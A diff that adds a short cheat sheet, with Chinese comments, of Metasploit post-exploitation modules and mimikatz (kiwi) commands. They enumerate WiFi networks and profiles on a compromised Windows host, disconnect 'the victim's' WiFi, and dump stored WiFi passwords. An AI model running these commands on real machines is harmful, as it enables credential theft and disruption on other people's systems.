@@ -1,0 +1,9 @@
+post/windows/wlan/wlan_bss_list  #获取所有wifi名
+post/windows/wlan/wlan_current_connection #获取当前连接的WIFI
+post/windows/wlan/wlan_profile  #获取WiFi的配置文件
+post/windows/wlan/wlan_disconnect #断开当前受害者的WIFI
+
+-------------mimikatz-------------
+load kiwi #加载mimikatz
+wifi_list #获取wifi列表和密码
+wifi_list_shared #获取wifi名称
